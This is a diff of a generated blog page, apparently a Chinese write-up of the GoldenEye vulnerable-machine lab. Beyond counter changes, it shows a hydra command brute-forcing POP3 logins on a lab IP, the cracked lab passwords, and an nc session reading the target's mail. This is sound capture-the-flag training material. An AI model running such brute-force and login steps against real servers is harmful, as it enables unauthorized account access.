@@ -182,12 +182,12 @@
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">103</span></a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">102</span></a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">92</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">91</span></a>
 
   </li>
   </ul>
@@ -304,9 +304,9 @@
 <h2 id="2-3-爆破邮箱账号，获取邮件信息"><a href="#2-3-爆破邮箱账号，获取邮件信息" class="headerlink" title="2.3 爆破邮箱账号，获取邮件信息"></a>2.3 爆破邮箱账号，获取邮件信息</h2><p>我们尝试用现有的两个用户名爆破邮箱口令。<br>sudo echo -e ‘natalya\nboris’ &gt; frank.txt<br>sudo hydra -L frank.txt -P /usr/share/wordlists/fasttrack.txt 172.16.50.129 -s 55007 pop3<br><img src="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672762507066.png" alt=""><br><img src="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672762593799.png" alt=""></p>
 <p>[55007][pop3] host: 172.16.50.129   login: natalya   password: bird<br>[55007][pop3] host: 172.16.50.129   login: boris   password: secret1!<br>用户1：boris/secret1!<br>用户2：natalya/bird</p>
 <p>使用nc读取账号中的邮件内容：sudo nc 172.16.50.129 55007<br><img src="http://zhengjie.ren/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672763024750.png" alt=""></p>
-<p>+OK GoldenEye POP3 Electronic-Mail System<br>user boris<br>+OK<br>pass secret1!<br>+OK Logged in.<br>list<br>+OK 3 messages:<br>1 544<br>2 373<br>3 921<br>.<br>retr 1<br>+OK 544 octets<br>Return-Path: <a href="mailto:&#114;&#x6f;&#x6f;&#116;&#64;&#49;&#x32;&#x37;&#x2e;&#48;&#x2e;&#x30;&#46;&#x31;&#x2e;&#103;&#111;&#108;&#100;&#x65;&#110;&#x65;&#121;&#101;">&#114;&#x6f;&#x6f;&#116;&#64;&#49;&#x32;&#x37;&#x2e;&#48;&#x2e;&#x30;&#46;&#x31;&#x2e;&#103;&#111;&#108;&#100;&#x65;&#110;&#x65;&#121;&#101;</a><br>X-Original-To: boris<br>Delivered-To: boris@ubuntu<br>Received: from ok (localhost [127.0.0.1])<br>        by ubuntu (Postfix) with SMTP id D9E47454B1<br>        for <boris>; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)<br>Message-Id: &lt;20180425022326.D9E47454B1@ubuntu&gt;<br>Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)<br>From: <a href="mailto:root@127.0.0.1.goldeneye">root@127.0.0.1.goldeneye</a></p>
+<p>+OK GoldenEye POP3 Electronic-Mail System<br>user boris<br>+OK<br>pass secret1!<br>+OK Logged in.<br>list<br>+OK 3 messages:<br>1 544<br>2 373<br>3 921<br>.<br>retr 1<br>+OK 544 octets<br>Return-Path: <a href="mailto:&#114;&#x6f;&#111;&#x74;&#64;&#x31;&#x32;&#55;&#x2e;&#48;&#46;&#x30;&#46;&#x31;&#46;&#103;&#111;&#x6c;&#100;&#101;&#x6e;&#x65;&#121;&#101;">&#114;&#x6f;&#111;&#x74;&#64;&#x31;&#x32;&#55;&#x2e;&#48;&#46;&#x30;&#46;&#x31;&#46;&#103;&#111;&#x6c;&#100;&#101;&#x6e;&#x65;&#121;&#101;</a><br>X-Original-To: boris<br>Delivered-To: boris@ubuntu<br>Received: from ok (localhost [127.0.0.1])<br>        by ubuntu (Postfix) with SMTP id D9E47454B1<br>        for <boris>; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)<br>Message-Id: &lt;20180425022326.D9E47454B1@ubuntu&gt;<br>Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)<br>From: <a href="mailto:root@127.0.0.1.goldeneye">root@127.0.0.1.goldeneye</a></p>
 <p>Boris, this is admin. You can electronically communicate to co-workers and students here. I’m not going to scan emails for security risks because I trust you and the other admins here.<br>.<br>retr 2<br>+OK 373 octets<br>Return-Path: &lt;natalya@ubuntu&gt;<br>X-Original-To: boris<br>Delivered-To: boris@ubuntu<br>Received: from ok (localhost [127.0.0.1])<br>        by ubuntu (Postfix) with ESMTP id C3F2B454B1<br>        for <boris>; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)<br>Message-Id: &lt;20180425024249.C3F2B454B1@ubuntu&gt;<br>Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)<br>From: natalya@ubuntu</p>
-<p>Boris, I can break your codes!<br>.<br>retr 3<br>+OK 921 octets<br>Return-Path: <a href="mailto:&#x61;&#108;&#x65;&#99;&#x40;&#x6a;&#97;&#110;&#x75;&#115;&#x2e;&#x62;&#x6f;&#115;&#115;">&#x61;&#108;&#x65;&#99;&#x40;&#x6a;&#97;&#110;&#x75;&#115;&#x2e;&#x62;&#x6f;&#115;&#115;</a><br>X-Original-To: boris<br>Delivered-To: boris@ubuntu<br>Received: from janus (localhost [127.0.0.1])<br>        by ubuntu (Postfix) with ESMTP id 4B9F4454B1<br>        for <boris>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)<br>Message-Id: &lt;20180425025235.4B9F4454B1@ubuntu&gt;<br>Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)<br>From: <a href="mailto:alec@janus.boss">alec@janus.boss</a></p>
+<p>Boris, I can break your codes!<br>.<br>retr 3<br>+OK 921 octets<br>Return-Path: <a href="mailto:&#97;&#x6c;&#x65;&#99;&#x40;&#x6a;&#97;&#x6e;&#x75;&#115;&#x2e;&#x62;&#111;&#x73;&#x73;">&#97;&#x6c;&#x65;&#99;&#x40;&#x6a;&#97;&#x6e;&#x75;&#115;&#x2e;&#x62;&#111;&#x73;&#x73;</a><br>X-Original-To: boris<br>Delivered-To: boris@ubuntu<br>Received: from janus (localhost [127.0.0.1])<br>        by ubuntu (Postfix) with ESMTP id 4B9F4454B1<br>        for <boris>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)<br>Message-Id: &lt;20180425025235.4B9F4454B1@ubuntu&gt;<br>Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)<br>From: <a href="mailto:alec@janus.boss">alec@janus.boss</a></p>
 <p>Boris,</p>
 <p>Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!</p>
 <p>Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages….</p>
@@ -533,7 +533,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">92</span>
+          <span class="site-state-item-count">91</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -544,7 +544,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">103</span>
+        <span class="site-state-item-count">102</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
